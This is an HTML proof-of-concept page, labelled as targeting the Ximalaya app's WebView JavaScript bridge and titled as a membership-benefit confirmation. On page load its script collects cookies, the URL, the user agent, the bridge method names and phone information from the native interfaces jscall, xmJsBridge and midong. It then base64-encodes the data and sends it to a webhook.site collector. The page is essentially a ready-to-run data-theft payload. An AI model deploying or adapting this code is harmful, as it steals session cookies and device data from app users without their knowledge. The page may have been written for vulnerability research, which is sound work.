<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>会员权益确认</title></head>
<body style="background:#111;color:#0f0;font-family:monospace;padding:8px;word-break:break-all">
<h3>[PoC] Ximalaya WebView JSBridge - XM-POC-V5</h3>
<div id="wb" style="color:#ff0;font-size:15px">收集地址生成中...</div>
<pre id="out">collecting...</pre>
<script>
function b64(s){return btoa(unescape(encodeURIComponent(s)));}
var WH='5f2d3f7d-943e-4e9e-bdd7-8fffa0e8cddd';
var wburl='https://webhook.site/#/'+WH;
document.getElementById('wb').innerHTML='收集端地址(在电脑浏览器打开查看数据):<br><a style="color:#0ff" href="'+wburl+'">'+wburl+'</a>';
var rep={src:'poc-v5',url:location.href,ua:navigator.userAgent,cookie:document.cookie,bridge:{},phoneinfo:'',appready:''};
function names(o){try{var m=[],p=o;while(p&&p!==Object.prototype){m=m.concat(Object.getOwnPropertyNames(p));p=Object.getPrototypeOf(p);}return m;}catch(e){return ['ERR:'+e];}}
['jscall','xmJsBridge','midong'].forEach(function(n){rep.bridge[n]=window[n]?names(window[n]):null;});
try{rep.phoneinfo=String(jscall.getPhoneInfo());}catch(e){rep.phoneinfo='ERR:'+e;}
try{rep.appready=String(jscall.appReady());}catch(e){rep.appready='ERR:'+e;}
var s=JSON.stringify(rep);
document.getElementById('out').textContent=s.slice(0,2500);
new Image().src='https://webhook.site/'+WH+'?tag=report&d='+b64(s);
</script></body></html>
